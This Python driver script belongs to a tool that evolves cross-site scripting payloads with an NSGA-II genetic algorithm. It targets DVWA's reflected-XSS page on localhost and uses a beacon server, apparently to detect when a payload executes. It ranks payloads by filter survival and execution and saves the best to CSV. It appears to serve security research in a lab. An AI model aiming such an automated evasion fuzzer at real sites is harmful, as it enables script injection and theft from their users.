# main.py
import random, time, os, csv
from deap import tools
from src.beacon_server import start_beacon_server
from src.ga_engine import setup_ga, component_render
from src.fitness import evaluate
from src.seed_loader import load_seed_pools
from src.send_request import login_dvwa

# GA Configuration
POP = 40
GEN = 40
CXPB = 0.6
MUTPB = 0.45
PATIENCE = 8

def run(target_url, param, seed_path="payload_base/xss_seed.txt", security_level=None):
    # Start beacon server
    start_beacon_server()
    time.sleep(0.3)

    # Login ke DVWA (opsional)
    try:
        login_dvwa(security_level=security_level) if security_level else login_dvwa()
    except:
        print("[!] login_dvwa failed or not needed.")

    # Load seeds
    pools = load_seed_pools(seed_path)
    tag_pool, event_pool, js_pool = pools["tags"], pools["events"], pools["js"]

    toolbox = setup_ga(tag_pool, event_pool, js_pool)

    # Initial population
    population = toolbox.population(n=POP)

    for ind in population:
        if tag_pool: ind[0] = random.choice(tag_pool)
        if event_pool: ind[1] = random.choice(event_pool)
        if js_pool: ind[2] = random.choice(js_pool)
        if random.random() < 0.35 and js_pool:
            ind[2] += random.choice(js_pool)

    # Initial evaluation
    for ind in population:
        ind.fitness.values = evaluate(ind, target_url, param)

    print("[+] Starting NSGA-II Evolution...\n")

    history = []
    best_exec_seen = 0
    no_improve = 0

    for gen in range(GEN):

        # NSGA-II selection
        offspring = tools.selNSGA2(population, len(population))
        offspring = list(map(toolbox.clone, offspring))

        # Variation
        for c1, c2 in zip(offspring[::2], offspring[1::2]):
            if random.random() < CXPB:
                toolbox.mate(c1, c2)
                del c1.fitness.values, c2.fitness.values

        for mutant in offspring:
            if random.random() < MUTPB:
                toolbox.mutate(mutant)
                del mutant.fitness.values

        invalid = [ind for ind in offspring if not ind.fitness.valid]
        for ind in invalid:
            ind.fitness.values = evaluate(ind, target_url, param)

        population[:] = offspring

        # Logging
        top_surv = max(ind.fitness.values[0] for ind in population)
        top_struct = max(ind.fitness.values[1] for ind in population)
        top_exec = max(ind.fitness.values[2] for ind in population)

        print(f"Gen {gen}: survivability={top_surv}, structure={top_struct}, exec={top_exec}")

        # Early stopping
        if top_exec > best_exec_seen:
            best_exec_seen = top_exec
            no_improve = 0
        else:
            no_improve += 1

        if no_improve >= PATIENCE and best_exec_seen > 0:
            print("[!] Early stopping triggered.")
            break

    # Pareto front
    pareto = tools.sortNondominated(population, len(population), first_front_only=True)[0]

    # Save results
    os.makedirs("results", exist_ok=True)
    csv_path = os.path.join("results", f"moga_{int(time.time())}.csv")

    with open(csv_path, "w", newline="", encoding="utf-8") as cf:
        writer = csv.writer(cf)
        writer.writerow(["payload", "survivability", "structure", "executed"])
        for ind in pareto:
            payload = component_render(ind)
            writer.writerow([payload, *ind.fitness.values])

    print("\n=== FINAL RESULTS ===")
    for ind in pareto:
        print("Payload:", component_render(ind))
        print("Scores:", ind.fitness.values)
        print("-" * 40)

    print("Saved to:", csv_path)


if __name__ == "__main__":
    run("http://localhost/dvwa/vulnerabilities/xss_r/", "name", security_level="high")
